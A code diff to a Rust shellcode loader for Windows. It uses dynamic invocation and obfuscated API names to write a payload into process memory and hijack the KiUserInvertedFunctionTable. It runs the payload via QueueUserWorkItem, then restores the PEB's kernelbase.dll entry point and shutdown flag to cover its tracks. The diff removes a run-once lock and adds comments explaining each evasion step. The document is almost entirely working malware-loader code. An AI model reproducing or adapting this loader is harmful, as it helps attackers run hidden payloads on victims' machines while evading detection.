@@ -11,8 +11,6 @@ use std::ffi::c_void;
 use std::mem::{size_of};
 use std::ptr::{self};
 
-static mut LOCK: u32 = 0;
-
 fn get_sh() -> String
 {
     // Replace this with your shellcode
@@ -25,18 +23,11 @@ fn get_sh() -> String
 fn run() -> bool
 {
     unsafe
-    {
-
-        if LOCK > 0
-        {
-            return true;
-        }
-
-        LOCK += 1;
-        
+    {        
         restore_peb();
 
-        let addr = 0 as isize;//ntdll + ntdll_metatada.opt_header_64.size_of_image as isize;
+        // Write our real payload on the current process' memory space
+        let addr = 0 as isize;
         let phand = HANDLE {0: -1};
         let addr: *mut c_void = std::mem::transmute(addr);
         let base_address_shellcode: *mut *mut c_void = std::mem::transmute(&addr);
@@ -113,6 +104,7 @@ fn run() -> bool
             return true;
         } 
 
+        // Replace the first value on the inverted function table to point to our injected shellcode
         let inverted_table: *mut data::_INVERTED_FUNCTION_TABLE = ki_user_inverted_function_table as *mut _;
         let old_value = (*inverted_table).table_entry[0].image_base;
         (*inverted_table).table_entry[0].image_base = *base_address_shellcode as isize;
@@ -144,6 +136,7 @@ fn run() -> bool
         let dir: *mut c_void = *base_address_shellcode; 
         let context: *mut c_void = std::mem::transmute(0isize);
         let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
+        // Run the injected shellcode on the default thread pool
         dinvoke::dynamic_invoke!(k32,&lc!("QueueUserWorkItem"),f,_r,dir,context,0x00000000 as u32);
         
         let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
@@ -166,7 +159,7 @@ fn run() -> bool
             return true;
         } 
 
-
+        // Restore the previously modified value of the inverted function table.
         let inverted_table: *mut data::_INVERTED_FUNCTION_TABLE = ki_user_inverted_function_table as *mut _;
         (*inverted_table).table_entry[0].image_base = old_value;
 
@@ -192,7 +185,11 @@ fn run() -> bool
 
     }
 }
-
+/*
+    Since we want our payload to be executed only once, we need to restore the PEB to its previous state.
+    To do so, we iterate again over the PEB's loaded modules list until we find the entry corresponding to
+    kernelbase.dll and we restore the entry point value.
+ */
 fn restore_peb()
 {
     unsafe
@@ -278,6 +275,7 @@ fn restore_peb()
 
                 let offset = (kernelbase as isize + 0x3C) as *mut u32; 
                 let rva = *offset as isize;
+                // Kernelbase.dll's entry point offset calculation
                 let entry_point_offset = (kernelbase + rva + 0x18 + 16 as isize) as *const u32;
                 entry.Reserved3[0] = (kernelbase + *entry_point_offset as isize) as *mut _;//addr as *mut _;//(bbb + off) as *mut _;//(test as *const()) as *mut _;//// 
                 let written = usize::default();
@@ -308,6 +306,10 @@ fn restore_peb()
     }
 }
 
+/*
+    Just in case this loader is triggered when the process is being terminated, we need to 
+    set the PEB's ShutdownInProgress value to false before calling QueueUserWorkItem.
+ */
 fn quit_shutdown()
 {
     unsafe
@@ -344,7 +346,6 @@ fn quit_shutdown()
         {
             return;
         } 
-
 
         let mut peb_ldr_data: data::PEB_LDR_DATA = std::mem::zeroed();
         let peb_ldr_data_ptr: *mut data::PEB_LDR_DATA = std::mem::transmute(&peb_ldr_data);
